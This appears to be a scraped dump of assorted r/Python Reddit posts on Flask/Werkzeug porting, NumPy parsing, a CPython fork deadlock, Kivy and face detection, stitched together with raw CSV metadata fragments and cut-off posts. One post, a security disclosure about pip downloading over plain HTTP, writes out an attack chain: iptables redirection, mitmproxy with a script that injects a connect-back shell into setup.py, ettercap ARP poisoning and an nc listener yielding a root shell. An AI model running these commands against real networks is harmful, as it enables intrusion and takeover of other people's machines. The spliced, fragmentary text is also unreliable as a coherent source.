UPDATES:

- NSFW indicator for Python (can't figure out where/how to place it in Java, but it still checks for NSFW so it won't load image previews)
- don't preload all images (thanks to canuckkat)
- use `def` instead of `class` in Python

There were some unfortunate API changes necessary due to the restricted bytes type on Python 3 which might show up:

- Werkzeug's `Headers.linked`was removed without replacement.  The API just does not work without string coercion.
- Werkzeug and Flask `Headers` now returns unicode objects all the time and headers are restricted to latin1.  This is the only thing that makes sense on PEP 3333
- `werkzeug.urls` is now rewritten from scratch without the stdlib and provides URL parsing and joining functions.  Use those instead of the stdlib one if you want code that works on 2.x and 3.x.  They are internally uniforming IRIs and URIs (or at least attempt).
- Some deprecated functionality was removed in Werkzeug and Flask.
- Flask's JSON support differs from the stdlib in unicode behavior on Python 3.  Use `flask.json` instead of `json` or `simplejson` on Python 3 to get unified behavior on 2.x and 3.x regardless of if the stdlib's JSON or simplejson module is used.
- non-silent usage of limited streams in Werkzeug is gone.  I suppose nobody used that anyways.
- Werkzeug's request objects now act as context managers and provide a close method.  This ensures that request resources are properly closed without the help of the garbage collector.
- Fixed some issues with the request object sometimes ignoring the `direct_passthrough` flag.  This might show some errors in your code now.
- Flask's teardown system got reworked due to exception handling changes on Python 3.  This might now have a knock-on effect if you have custom error handlers.  You might now get an error passed to teardown functions which were previously already hidden.  This change is probably for the better due to teardown handlers being used for resource management.

To see if your app works with the changes check out the master branches from github and install them into a virtualenv.

Here are a couple that were passed around a mailing list I'm on:

---

&gt;'list.sort' returns the sorted list. (Wrong: it actually returns None.)

---

&gt;Misconception: The Python ""is"" statement tests for equality.

&gt; Reality: The ""is"" statement checks to see if two variables point to the same object.

&gt;This one is especially nasty, because for many cases, it ""works"", until it doesn't :)

&gt;In [1]: a = 'hello'

&gt;In [2]: b = 'hello'

&gt;In [3]: a is b

&gt;Out[3]: True

&gt;In [4]: a = 'hello world!'

&gt;In [5]: b = 'hello world!'

&gt;In [6]: a is b

&gt;Out[6]: False

&gt;In [7]: a = 3

&gt;In [8]: b = 3

&gt;In [9]: a is b

&gt;Out[9]: True

&gt;In [10]: a = 1025

&gt;In [11]: b = 1025

&gt;In [12]: a is b

&gt;Out[12]: False

&gt;This happens because the CPython implementation caches small integers and strings, so the underlying objects really are the same, *sometimes*.

&gt;If you want to check if two objects are equivalent, you must always use the == operator.

1362516368.0,202,self.Python,19q8nt,PSA: Consider using NumPy if you need to parse a large binary data file with a fairly simple format,moyix,233,31,34,http://www.reddit.com/r/Python/comments/19q8nt/psa_consider_using_numpy_if_you_need_to_parse_a/,"I'm not sure how many people know about this, but since I just introduced it to a third person today, I thought it might be useful generally.

Often I'll end up in a situation where I have a huge (like 6-10 GB) data file that's made up of lots of fixed-length structures, e.g.:

    struct foo {
        uint64_t x;
        uint64_t y;
        uint64_t z;
        int32_t bar[256];
    };

Now, you could parse this in pure Python using struct:

    import struct
    fmt = ""&lt;QQQ256i""
    sz = struct.calcsize(fmt)
    f = open('bigfile.bin')
    recs = []
    while True:
        data = f.read(sz)
        if not data: break
        recs.append(struct.unpack(fmt, data))

But for me this takes a long time for large files (around 2-3 minutes on a 6GB file) and it uses up a lot of memory to store a lot of Python objects (12G for that 6GB file).

Instead you can use NumPy's support for reading structured arrays into a numpy array:

    import numpy as np
    f = open('bigfile.bin')
    rectype = np.dtype( [ ('x', '&lt;u8'), ('y', '&lt;u8'),
                          ('z', '&lt;u8'), ('bar', '&lt;i4', 256) ] )
    recs = np.fromfile(f, dtype=rectype)

Which only takes 8 seconds on my machine, and uses only the 6GB of memory that data does on disk. Plus, you can make use of NumPy's excellent and fast array operations, like ""give me the average of the product of the x's and z's"": `np.mean(recs['x']*recs['z'])`.

So, if you need to do this kind of binary parsing, consider NumPy!",,False,,t5_2qh0y,False,,,True,t3_19q8nt,http://www.reddit.com/r/Python/comments/19q8nt/psa_consider_using_numpy_if_you_need_to_parse_a/,

Eventually, you'll see several Python child processes (not threads) sitting in a deadlocked state. Attach gdb to any of them, and you'll see a backtrace that looks like this:

    #0  sem_wait () at ../nptl/sysdeps/unix/sysv/linux/x86_64/sem_wait.S:86
    #1  0x00000000004e02ad in PyThread_acquire_lock (lock=&lt;value optimized out&gt;, waitflag=&lt;value optimized out&gt;) at Python/thread_pthread.h:321
    #2  0x00000000004e0447 in find_key (key=1, value=0x0) at Python/thread.c:268
    #3  0x00000000004e053b in PyThread_get_key_value (key=38356064) at Python/thread.c:360

    #6  0x00000000004e43f9 in PyOS_AfterFork () at ./Modules/signalmodule.c:979

What's going on here is as follows. CPython uses a mutex, independent of the GIL, to control access to the structures that are used to implement [threading.local](http://docs.python.org/library/threading.html#threading.local). Any time a new Python thread starts up, it *very* briefly acquires this mutex in order to initialize its storage. Code called from PyOS_AfterFork() (which, as its name suggests, is responsible for doing various initialization right after a Python subprocess is forked off) also acquires this mutex; this code was introduced as part of the resolution for [issue 10517](http://bugs.python.org/issue10517). When you call fork() from a multithreaded program, the resulting child process is single-threaded; only the thread that called fork() gets copied over. Consequently, CPython-2.7.2 has a race condition: if one Python thread calls subprocess.Popen(), or anything else that forks off a subprocess, at the same time that another Python thread is initializing, and the fork occurs in the very narrow window in which the thread-local storage mutex is being held, then the resulting child process will be created with the mutex still held, and nothing to release it. Then, when PyOS_AfterFork() goes to acquire that mutex, it deadlocks.

I maintain a piece of (in-house and proprietary) server software which runs on a very large network. Last month I updated it to run on python2.7, and this update was deployed to on-the-order-of one thousand servers. This bug cropped up on two servers out of those thousand. Luckily for my sanity, ops contacted me first rather than just restarting those servers, and I was able to grab a core image, see a backtrace like the one above, and eventually reproduce it with the above test case.

The kicker? CPython-2.7.3 reverted the issue 10517 patch, thereby fixing this bug by accident. ",,False,,t5_2qh0y,1337172713.0,,,True,t3_tpixc,http://www.reddit.com/r/Python/comments/tpixc/ive_spent_the_past_week_tracking_down_a_bug_in/,

It was the creation of Mark Dominus, who is also a redditor btw.  

Anyway, the way it worked is that every week, Mark would post a programming problem on his website and then people would submit their solutions and then everyone would discuss the pros and cons of the different ways to solve the problem.  It was really cool.  Here's a sample problem: http://perl.plover.com/qotw/r/001

It would be fun to do the same kind of thing right here in Python.  I suppose you could do the same thing on StackOverflow, or perhaps more appropriately here: http://codereview.stackexchange.com, but that's not nearly as fun as reddit.  Anyway, let me know if you're interested.

For what's it worth, I am hardly a Python guru and I am open to anyone posting problems i.e. I don't have a quiver of interesting problems stored away anywhere.  Generally, I'm thinking of problems like the QOTW ones - small, algorithm oriented problems, not how to connect to Postgres from Django type stuff.

Part of my motivation for this is that I don't get to code in Python a lot at work these days.

EDIT: OK, sweet, it sounds like there's some interest.  I guess the format should be to post a problem here in r/Python with a title like: Python Quiz of the Week - &lt;DATE&gt;.  I'm at work right now, so I can't really spend too much time on this at the moment.  I'll be back later tonight. . . anyone have any suggestions for a first problem? 

EDIT PART 2: OK, so of course, anyone can post a quiz and anyone can answer one however/whenever they want to.  My current idea is this - I'll post the first quiz.  This is one from an old interview so I already have a solution but I might update mine a bit anyway because, like all the code I write, I always want to clean it up/improve it when I review it at a later date.  

OK, so I'll go ahead and post it now. . .

EDIT PART 3: posted here: http://www.reddit.com/r/Python/comments/n3arf/python_quiz_of_the_week_1/
So get to it!  Seriously though, it's not a race.  The way the Perl QOTW worked was based on a mailing list, so solutions weren't even posted to the site till a week later.  I'm guessing people will probably start posting solutions immediately, which is cool.  I'm looking forward to this.

Hello Pythonistas! As many of you know, [reddit is written in Python](http://github.com/reddit/reddit). We use Python to get you your cats, to process your karma, to help you vote. If we could swap out our JS for Python, we might even do that. Naturally, we're going to be hanging out at the US PyCon in Santa Clara, CA this weekend - reddit is a sponsor, after all. We like talking to other python programmers of all levels, hearing what you're doing, and ~~we might have some spare stickers~~ it's probably against the rules of the conference for us to hand out stickers. So don't ask us for stickers. Definitely do not ask.

**If you're hanging out after the main conference, so are we!** We'll be hosting a [reddit ""sprint""](https://us.pycon.org/2013/community/sprints/projects/#reddit) in the days following the conference. Come down and build that thing you've always wanted reddit to have.

1359827998.0,152,self.Python,17rfh7,Warning: don't use pip in an untrusted network! – a practical man-in-the-middle attack on pip,Xykr,180,28,111,http://www.reddit.com/r/Python/comments/17rfh7/warning_dont_use_pip_in_an_untrusted_network_a/,"I've been messing around with pip lately and noticed something I wasn't quite aware of before, and I'm posting it here to make sure everyone knows about this (self post, no karma).

## The problem

**pip downloads all packages over plain HTTP** (even though PyPi *has* a valid certificate; Edit: has only got a CACert cert). There is a simple MD5 checksum check, but this doesn't help much as long as they are transmitted over an insecure channel. You usually run pip as root (unless you are installing into a virtualenv), and pip runs the `setup.py` from the downloaded package. Yes, if you do `pip install something`, **you are theoretically giving root access to everyone who could intercept your connection** (this includes everyone on your local network). This is quite unbelievable.

**DO NOT install packages using pip (and possibly easy_install) in an untrusted environment!**

I wanted to verify how easy it is to exploit this, because there's always someone who will tell you that a possible attack is too complicated and too much effort to implement. It's not.

I've hacked together a script which intercepts all package files downloaded from PyPi, unpacks them, adds an additional line to `setup.py` which will connect back to the attacker and provide him with a (root) shell and packs the archive again. This only takes a second or two and works fully transparent.

## Proof Of Concept

See this as an example on how easy it is to exploit this and similar vulnerabilities.

You need a few packages for this to work:

    sudo apt-get install atool
    sudo pip install mitmproxy

(if you have not heard of mitmproxy before, go take a look at the docs – it's a very useful HTTP debugging tool)

Download this gist and save it as `pip_intercept.py`:

https://gist.github.com/4698537


Set up forwarding rules:

    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

Run the proxy:

    mitmproxy -T -z -s pip_intercept.py

Now, you should see all HTTP traffic forwarded by your machine running through mitmproxy. You either have to run this on a gateway, or use a tool like `ettercap` to redirect traffic over your local machine. 

Example:

    sudo ettercap -o -T -P repoison_arp -M arp:remote /192.168.1.1/ /192.168.1.33/

This intercepts all traffic between 192.168.1.1 (the gateway) and 192.168.1.33 and re-routes it over your machine.

The script loaded into mitmproxy will automatically manipulate all PyPi downloads and connect back with a shell to the IP and port specified in the script.

I've tried this in my lab and it worked perfectly well.

First, I started a listener on the attacker machine:

    nc -l 4444

Then, I downloaded an arbitrary package on one of the machines in the network:

    ~# sudo pip install requests

    Downloading/unpacking requests
      Downloading requests-1.1.0.tar.gz (339kB): 339kB downloaded
      Running setup.py egg_info for package requests
        
    Installing collected packages: requests
      Running setup.py install for requests
        
    Successfully installed requests
    Cleaning up...
    
Then, back on the attacker machine:

    id
    uid=0(root) gid=0(root) groups=0(root)

Remote root shell! Ooops. (if you would improve the script a bit it'd work on Windows as well).

## Solution?

Never, ever download something over an unsecure connection and then execute it, especially not as root, if you can't verify its integrity. I don't understand why this wasn't already fixed like a few years ago. The average user clearly isn't aware of this danger.

Can't be that hard to fix (if I've got some more spare time I'll try it myself instead of just complaining).

Ruby's `gem` package manager, for example, uses SSL *and* verifies the cert:

     WARNING:  Error fetching data: SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/latest_specs.4.8.gz)
     ERROR:  While executing gem ... (Gem::RemoteFetcher::FetchError)
     SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/gems/bundler-1.2.3.gem)

**Edit:** I've just got an angry PM – no, I did not want to imply that Ruby is more secure than Python (just read the recent posts in /r/netsec about some *very* embarrassing Rails bugs). I wanted to point out that other similar package managers have implemented this a long time ago, not start yet another language war. Guess what, I use both languages and while Python beats most other languages in many aspects (and loses in others) and it's my preferred language, both are great. The right tool for the job.

**Edit 2:** Unsurprisingly, `easy_install` is vulnerable as well. Just in case anyone was wondering.

(because you're worth it)

Do you use ipython? You should. If you don't have it, get it with pip!

    $ sudo pip install ipython

If you do have ipython, make sure you have the latest version

    $ ipython -v # use --version if -v fails
    $ # should be &gt;= 0.12, if not, run upgrade command below
    $ sudo pip install --upgrade ipython

Now that we all have ipython, create a profile (this allows you tweak settings and autorun commands):

    $ ipython profile create # tells you where config file is located

My config file ended up in `~/.ipython/profile_default/ipython_config.py`. Check the output of the command to see where your config file is located. Open that file with your favorite $EDITOR (mine's vim)

    $ vim ~/.ipython/profile_default/ipython_config.py # or whatever editor you want

Look for the line

    c.InteractiveShellApp.extensions = []

change it to

    c.InteractiveShellApp.extensions = ['autoreload']

also change the line 

    c.InteractiveShellApp.exec_lines = []

to

    c.InteractiveShellApp.exec_lines = ['%autoreload 2']

(Note to the curious: there are other autoreload options, run `%autoreload?` in ipython to learn about them)

That's it! Write some code, load it up in ipython. Change some values, and verify that ipython reloads the relevant code and objects. No more fussing around with `import blah; reload(blah); from blah import *;`, good riddance.

In this last bit I'm not really joking.

I had many newbie critiques a few years ago - 'self', the fact that you can't join a string list with myList.join(', '), something about slicing that I forget now, that it was confusing which things worked in-place, and which worked on a copy, etc. - and in a forum (not reddit) where I posted up my lengthy list (mostly to see what people thought of these things), I was met with a wall of responses, all strongly in favor of every last part of all of it, and even of things I hadn't mentioned. In 3 years I realize now I have never once seen anyone critique any part of the language and not be met with all manner of deep, philosophical justifications as to why that thing or those things *must* be that way.

It's the perfect language, I guess.

So my new question is just straight up: *IS* there anything about Python you don't like? I mean, it is moving to 3, and there are changes, so clearly 2.x had room for improvement, so let's hear it. Be prepared for a battle on all fronts from everyone else in here, though, whatever you say :) I'd love to hear from the real experts, the people who usually wield seemingly powerful reasoning and long strings of computer science words in their arguments.

I've been searching for information about the best practices about modules and namespaces, and using ``__init__.py`` to manipulate them. Yet I haven't been able to find a generally accepted approach.

Considering a package with multiple modules (and possibly sub-packages), there seems to be 3 different approaches:

1. Leave the ``__init__.py`` blank. This enforces explicit imports and thus clear namespaces. I've read Alex Martelli post in favor of this option on various questions at Stack Overflow. The cons are, the user of the package has to import seperate modules and call them with the dot notation.

1. Import all modules in ``__init__.py``. The user doesn't have to do multiple imports. The cons are explicit vs implicit, and also as Martelli puts it (paraphrased), ""if that's how your package works, maybe it should all go in a single module anyway"".

1. Import key functions from various modules directly into the package namespace. If you restructure modules, you still have the option to keep the same API for end users. Cons, it dirties the namespace, and very implicit / hacky.

I've been looking around at Github, and I've seen all 3 approaches in various projects. So I'm guessing there isn't really a consensus on what is the best practice.

I'm really interested in hearing from the pros, how they think about this, what they do, what they suggest... Or maybe there are subtleties that I'm missing... Any help is appreciated.

Thanks in advance

1271346943.0,121,self.Python,brcpk,[Official announcement] List of all the submissions that got incorrectly autobanned by the spamfilter,BioGeek,150,29,22,http://www.reddit.com/r/Python/comments/brcpk/official_announcement_list_of_all_the_submissions/,"Dear Python community,

The reddit admins recently made some changes which allowed the subreddit mods to have a better view on which submissions got autobanned by the spam filter. To our horror, we discovered that the spam filter for the Python subreddit had a terrible false-positive rate. Out of the about 170 autobanned submissions only ten were genuine spam posts!

The spam filter is [trained on a per-reddit basis](http://blog.reddit.com/2008/06/per-reddit-automated-spam-filters.html) each time a moderator bans or un-bans a link or comment. To kick some sense back into our spam-filter I unbanned all 160 posts that got incorrectly trapped. They are listed below for your reference. I give my sincere apologies to all the submitters and authors who were affected. 

I feel especially sorry for all submitters who made a *self*.Python or AskPython post: your question being greeted by complete silence is not the message we as a community want to send out. The reddit admins are [rolling out a system of deputy moderation](http://blog.reddit.com/2010/04/youve-been-drafted.html) which should hopefully prevent this from happening again in the future.

We've just released Kivy 1.7.0. You can download it at [kivy.org](http://kivy.org)

There is severals new features, but let's share theses one:

* Garden. As some of you have seen on the documentation, Garden is a place for the community that aims to centralize users' addons and widgets for Kivy. We provide a tool to search, install in your system or in your application layout, update, uninstall, garden package. If you want to participate and share your widgets with the community, that's the way to go! Join us at:

    http://kivy-garden.github.io/

* Android emulator support. If you use python-for-android, cleaning and updating the source code should give you the latest kivy version whitch already supports the Android emulator (assuming it has gpu acceleration activated). We also support ETC1 texture compression format, which is the standard on the Android platform.

* ScrollView has been refactored: the scrolling part is now separated as an effect, using a better physics calculation and timing. Multiple effects are currently available, such as a DampingScrollEffect (the default), and OpacityScrollEffect. This design will allow us to implement Pull-and-release scrollview as we're seeing on mobile (gmail, twitter etc.).

* Kv Dynamic classes. Most users never understood why kv Templates don't act the same as others widget, we'll not argue about implementation details, but they are right, it wasn't good. Dynamic classes allow you to create a widget class on-the-fly. The syntax is very simple:

        &lt;MyCustomButton@Button&gt;:
            # usual rule content here.

    It's equivalent to:

        class MyCustomButton(Button):
            pass

   If you want to access it from Python, just use Factory.MyCustomButton.

I am currently a developer at a well known software company in Redmond, Washington that's growing weary of being so enveloped in the .NET world. So much so, that I've decided to start attempting to switch to another popular software and search behemoth located in Mountain View, California. For the sake of scope, I'll be applying for web-centric software engineer positions.
 

**What I need help understanding**

Why is Python so popular and what are some stories for businessy projects written in Python? Are companies like Google even using Python for large apps or is it simply for smaller scripts?
 

**My Goal**

I've been trying to think of hobby projects to demonstrate Python knowledge on my GitHub. Ones that mimic the sort of problems I'd face as an engineer in the field, not simply academic ""count the fish in the bowl"" problems. Most of what I think of, I find myself thinking that Java, C++, or even JavaScript/Node would be a more reasonable language choice.
 

**tl;dr**

I feel like I have a Swiss Army Knife of skills, but I don't really know what this particular tool (Python) is best suited for in a business environment.

And thanks to those who make it useful!,fultonium,143,40,34,http://www.reddit.com/r/Python/comments/dqi4g/use_python_and_thanks_to_those_who_make_it_useful/,"i'll try to make this brief but it just occurred to me how insidiously useful this thing called python is and felt i should share.  i just finished several hours of homework and there were multiple occasions where a trivial amount of python code turned the drudgery of busywork into the joy of learning (wow, allow me to turn the flowery vocab down to 6 or 7).

but it's true.  in both my discrete math and linear algebra homework i was able to use python to explore some concepts and actually get a better grip on the material.  and what makes that so cool (and yeah, i get the irony of using 'cool' when describing how a programming language helped with my math homework.  but i was listening to led zeppelin during, so back off...) is how little code it took and how little experience i have.

i've been playing with python for a few weeks and have done a couple of relatively significant scripts (~200 lines of code) and a django app or two, but i am by no means even close to being an expert.  and yet i can sit down and turn 'hey, wouldn't it be cool if...' into 'hey, check out what my script does' with a minimum of frustration.

which brings me to my second point: a big, huge THANKS to all those who've spent days/weeks/months/years/decades contributing code and working to make the language (and all that that entails: std lib, docs, add-on modules, etc) what it is.  every time i've thought 'i wonder if there's a module that can do x?' i find one that does x, y, &amp; z and usually in a more elegant or functional manner than i envisioned.  and every time i've struggled to figure out how to do something, there's inevitably a blog or stackoverflow entry that clarifies the concept.  so, again, i say thanks to all that are deserving.

anyway, that's pretty much it.  i do want to add a couple things though.  first, this isn't meant to be a 'python is so much better than insert-other-lang-here' screed.  i've played with several other languages and found python to work best in my brain.  that's all.

secondly, i've noticed a lot of posts about getting started and, as someone who's just progressing out of the 'deer-caught-in-headlights-beginner' stage, wanted to pass a couple things along.

1. http://code.google.com/edu/languages/google-python-class/
work through the videos and exercises and you'll be well on your way to getting the language under your fingers.

2. Python Essential Reference, 4ed
this is one of those books where you'll bang your head against something for hours (days) and finally look it up in here and there will only be like a sentence or two, but it's exactly what you needed.  every.  freaking.  time.

3. stackoverflow
just click the python tag and look at the most-voted.  lots of good general info and useful compilations.  you'll overload the first couple times but as you learn more stuff, go back and reread and you'll find all kinds of super-useful ideas and concepts.

4. and lest you think i'm forgetting the obvious, /r/python.  but then, you're already here aren't you, smart-ass?

I'm coming from a C#/Visual Studio background where placing breakpoints and stepping through the code is second nature. But for python code I tend to use print() statements a lot more and just run the code. For any project beyond very small things it feels like the wrong thing to do yet that's what I end up doing. I'm using eclipse and PyDev so I have the tool support for ""real"" debugging. 

So, /r/python, what's your preferred debugging method? Print statements or breakpoints in an ide? Perhaps something else?

5. Multi threading does not work great in Python. It is inconsistent across platforms.
6. Python2 is a lot more deployment-friendly than Python3.

1354298680.0,91,self.Python,14287d,"Sick at home today, so decided to try out Kivy 
(report in comments)",larsga,117,26,24,http://www.reddit.com/r/Python/comments/14287d/sick_at_home_today_so_decided_to_try_out_kivy/,"I've been a Python programmer for so long I used to do GUI stuff with Tkinter and then wxPython, then stopped doing GUI at all for a long time. But Apple killed the screensaver that shows your photos (it no longer recurses into subdirs, and with 21,000 photos...) So, I decided to write my own replacement, and figured I might as well learn Kivy while I was at it.

It took 30 minutes to come up with a script that worked, showing images, replacing them, quitting on keyboard input, etc.

    import kivy
    kivy.require('1.4.1')
    
    import random, os
    from kivy.app import App
    from kivy.uix.image import Image
    from kivy.core.window import Window
    from kivy.clock import Clock
    
    #Window.fullscreen = 'auto'
    
    class PhotoScreensaver(App):
    
        def __init__(self):
            App.__init__(self)
            self.photos = []
            find_all_photos(self)
        
        def build(self):
            keyb = Window.request_keyboard(self.stop, self)
            keyb.bind(on_key_down = self.key_pressed)
            self.image = Image()
            self.change_image()
            Clock.schedule_interval(self.change_image, 10)
            return self.image
    
        def key_pressed(self, keyboard, keycode, text, modifiers):
            self.stop()
    
        def change_image(self, whatever = None):
            self.image.source = random.choice(self.photos)
    
        def add_photos(self, nothing, dirname, files):
            for file in files:
                if file.endswith('.jpg') or file.endswith('.JPG'):
                    self.photos.append(os.path.join(dirname, file))
    
    def find_all_photos(app):
        os.path.walk('/Users/larsga/data/bilder/privat', app.add_photos, None)
            
    if __name__ == '__main__':
        #Window.toggle_fullscreen()
        PhotoScreensaver().run()

However, I still haven't gotten the thing to both go fullscreen and show images. It shows images as is. I can also make it go fullscreen without doing anything, but that's as close as I've gotten.

I highly recommend anyone starting out with an open source project to solicit feedback from Reddit in this manner.  Here are some examples of (and thanks for) the advice I received.  Every suggestion listed here has been integrated into protlib 1.1, which was released last night:

* Thanks to [wacky](http://www.reddit.com/user/wacky) for reminding me to use an \_\_all\_\_ variable to define what's exported by my module, for suggesting that I add a lot of docstrings to supplement my online documentation, and for recommending that I implement a \_\_setattr\_\_ function to perform validity checking and give useful error messages when someone uses the wrong data type.

* Thanks to [crunk](http://www.reddit.com/user/crunk) for suggesting that I add the size of each data type to my [table of basic data types](http://courtwright.org/protlib/#basic-data-types).

* Thanks to [qiwi](http://www.reddit.com/user/qiwi) for telling me to never call [socket.setdefaulttimeout](http://docs.python.org/library/socket.html#socket.setdefaulttimeout) when my module is imported.

* Special thanks to [jart](http://www.reddit.com/user/jart) who sent lots of advice and code samples to help me change protlib to use [the logging module](http://docs.python.org/library/logging.html) internally, which makes it easy to customize logging; I even added a [new section](http://courtwright.org/protlib/#advanced-logging) to my documentation based on her suggestions.  She also helped me identify some places where I should be doing better bounds checking on strings and arrays, so as a result I added lots more checks, warnings, errors, and unit tests.

* Finally, a broad thanks to everyone who provided positive feedback, especially the several people who suggested other libraries I could look at for ideas and guidance.

Anyway, I hope that we see more people using Reddit to get advice on their libraries as time goes on.  My case has shown that our community responds kindly and helpfully to such requests for feedback, and I hope that this inspires others to seek this kind of help in the future.

**EDIT:** This may go without saying, but please post any further suggestions and feedback that you might have!

I am profficient, productive and comfortable with it and the surrounding ecosystem, using it from quick &amp; dirty data wrangling scripts to multi-10KLOC codebases and everything in between. Every now and then I toy around with other languages and platforms but they never stick for more than a few days. There are probably several reasons for this - excessive familiarity with the ""old and trusted"", Python having set the bar too high for most alternatives to surpass, lack of extrinsic motivation, etc. But at the end of the day I feel I should diversify my tool and skill set, especially since I am about to switch from fulltime employment to freelancing/consulting. 

Ruby (and Rails) is perhaps the most natural choice, and the demand for it is as high or higher as for Python. On the other hand, the similarity between the two is exactly the reason that has prevented me from diving into Ruby yet; there's just too little comparative advantage (if any) for someone already productive in one to become profficient in the other. Javascript could be another decent choice, and the fact that you can ostensibly use the same language for both Web frontend and backend code is appealing (though I'm sure that simply learning Javascript does not automatically make one a full-stack developer).

So I'd love to read some thoughts about this, and more specifically:

1) Is branching out to other programming platforms and communities a smart (or even necessary) move, as opposed to, say, establishing oneself as a specialized ""Python expert"" or branching out to different application domains (e.g. finance) while still sticking with Python?

2) If yes, what are some good options for a veteran Python programmer? 


EDIT: just to clarify based on the replies so far, I am mostly interested in insights from a professional rather than intellectual curiosity point of view. So although I recognize that one can gain valuable lessons from an experimental or esoteric language, I don't think I can really dedicate the time and effort to master it if the chances of getting a job or contract that requires it are virtually nil (especially for someone that doesn't live in SV/SF/NY).

1311046732.0,86,self.Python,ith3g,Reinventing the Wheel: Face Detection in Python - Detecting a Face,tsumnia,95,9,35,http://www.reddit.com/r/Python/comments/ith3g/reinventing_the_wheel_face_detection_in_python/,"I'm developing a project for Reddit (as a teaser, we'll call it the 'AFR'), which involves handling a large portion of face detection and feature extraction. For the project, I could use methods I used in my thesis (third-party software to detect the face, then features). Instead, I've decided to REINVENT THE WHEEL(!) to refine my understanding of the process of face image processing. Why? Because companies don't hire developers who can use tools, they want people who understand the ins and outs. I've chosen Python mostly for my affinity to the language, despite performing slower than lower-level languages.

For starters we'll use OpenCV's Python bindings, to give an understanding of face detection. If you Google 'python face detection' you'll find a number of OpenCV implementations, mostly for web cameras. In my demonstration we'll use static images, since that will be what I'll be expecting in my project.

So after that long winded intro, let's jump into today's code: 

**Detecting a Face using OpenCV's Python Bindings!**

    import cv

    hc = cv.Load(""haarcascades/haarcascade_frontalface_default.xml"")
    img = cv.LoadImage(image, cv.CV_LOAD_IMAGE_COLOR)
    imgName = image[::-1]
    imgName = imgName[imgName.find('.')+1:][::-1]
    faces = cv.HaarDetectObjects(img, hc, cv.CreateMemStorage(0), 1.2, 2, 0, (20, 20))
    if faces:
        for (x,y,w,h),n in faces:
            cv.Rectangle(img, (x,y), (x+w,y+h), (255,255,255))
    cv.SaveImage(imgName+'_Detected.png', img)

One of the most common ways to detect objects, especially faces, is through [Haar-like Features](http://en.wikipedia.org/wiki/Haar-like_features). OpenCV has done the exhaustive part by including a plethora of different style haar-like features (including 4 frontal face versions).

In the code snippet above, we see 5 separate calls to the CV module.

* [cv.Load](http://opencv.willowgarage.com/documentation/python/core_xml_yaml_persistence.html?highlight=load#Load) handles loading the haar-like features we want to search for. In this case I've used the default version, though in personal tests I found 'alt.xml' to provide optimal detection.

* [cv.LoadImage](http://opencv.willowgarage.com/documentation/python/highgui_reading_and_writing_images_and_video.html?highlight=loadimage#LoadImage) obviously loads our image for processing. You can specify whether or not it is a color image by setting the 2nd argument to 0 or 1 (or cv.CV_LOAD_IMAGE_COLOR).

* [cv.HaarDetectObjects](http://opencv.willowgarage.com/documentation/python/objdetect_cascade_classification.html?highlight=haardetectobjects#HaarDetectObjects) is where the real meat and potatoes of using OpenCV for detection comes into play. By specifying our image, our haar features and some other parameters, we can effectively find our object. We can even specify the minimum size of our object, for example, do we REALLY want to detect that random face in the background that's 50 feet way? This also helps remove falsely detected faces. Good practice is to set this to be some percentage of the image's width/height instead of a constant size, unless you are working in strict image sizes.

* [cv.Rectangle](http://opencv.willowgarage.com/documentation/python/core_drawing_functions.html?highlight=rectangle#Rectangle) simply draws a square around our detected faces based on the returns of cv.HaarDetectObjects.

* [cv.SaveImage](http://opencv.willowgarage.com/documentation/python/highgui_reading_and_writing_images_and_video.html?highlight=saveimage#SaveImage) takes the loaded image, along with alterations, and saves it to a new image.

And that is how we find objects through OpenCV! As personal time allows it, I'll post explanations of implementing the [Viola-Jones algorithm](http://en.wikipedia.org/wiki/Viola%E2%80%93Jones_object_detection_framework) via Python in order to detect faces, and then extracting the specific features of our detected objects using a technique known as [Active Appearance Modeling](http://en.wikipedia.org/wiki/Active_appearance_model), which a focus on [Stacked Active Shape Modeling](http://www.milbo.users.sonic.net/stasm/), and creating a custom Haar-like Feature Vector.

If there is any feedback from /r/Python, I'm more than receptive. My end goal for my own project is to develop a full Python feature extractor without CV, so anything to refine my own education is more than welcome. Likewise, if people are interested in the project, send me a PM and I'll fill you in on what needs to be done.

1281688657.0,84,self.Python,d0p7e,Port to Python 3... complete! (advice sharing thread),hsoft,115,31,9,http://www.reddit.com/r/Python/comments/d0p7e/port_to_python_3_complete_advice_sharing_thread/,"The dependencies (pyobjc, py2app, pyqt, lxml, pyyaml, py.test) for my (non trivial) desktop apps having recently been met, I ported one of them, successfully. I thought I'd share some of my advices, and I also thought people who also ported apps to python3 could do the same.

1. For the vast majority of the code, a simple `2to3` run is actually all you need.
2. The biggest chunk of problems you'll have during the port will probably come from string/bytes, and the biggest chunk of this subset of problems can be solved by opening your files with the correct mode ('t' or 'b'). (Blah, I couldn't manage to correctly format my snippet. In short, if you open a file in 't' mode, you get `str` from it, and if you open it in 'b' mode, you get `bytes` out of it)
3. I had an old workaround for an old bug in sqlite where it wouldn't correctly open unicode filenames. The bug had been fixed since, but the workaround stayed and it involved encoding using `sys.getfilesystemencoding`. Check if you have any of those and remove them, they're bad.
4. If you use StringIO in python 2, you probably want to use BytesIO in python 3. (I used it for fake file io in tests)
5. In PyQt, a new API has been added recently and PyQt automatically switches to the new API when running under Python 3. I would suggest switching to the new PyQt api *before* starting the py3k port. You can select the old api under Python3, but in my cases selecting it for `QString` resulted in crashes so I was kind of forced into the new api. Doing so under python2 would have resulted in a smoother ride for me.
6. UI/RC files in PyQt. First, you now have to call `pyrcc` with `-py3` to make it generate python3 files. Second, the resulting python files for UI have non-relative imports, which means that the folder with your UI-built python modules *have* to be in your `sys.path`
7. Porting C source files is much trickier than .py files. The changes made to the C API in Python aren't documented.
8. I had a call to `PyObject_CallMethodObjArgs` under python 2 for which I, mistakenly, didn't put a `NULL` at the end of my arguments. It worked well until python 3, under which I got crashes. It took a while for me to find the cause of it (I'm not very experienced with C).
9. Some C functions which used to take `char *` now take `wchar_t *`. Be aware.
10. If some of the libraries you use have just recently been ported to py3k, be aware that you might be a guinea pig, as you might be one of the firsts to actually use the library under py3k. In my case, it's py2app. I'm already one of the few to use it with the ""plugin"" option, I was the first one to use the plugin option under 3k, that's for sure (the C file for plugins wasn't ported at all). I had to roll up my sleeves, open my C In a Nutshell book, and dive in (I'm glad I did though. A good opportunity for learning stuff about Python's C API).

&gt; Why would company policies that ban github permit your alternative?

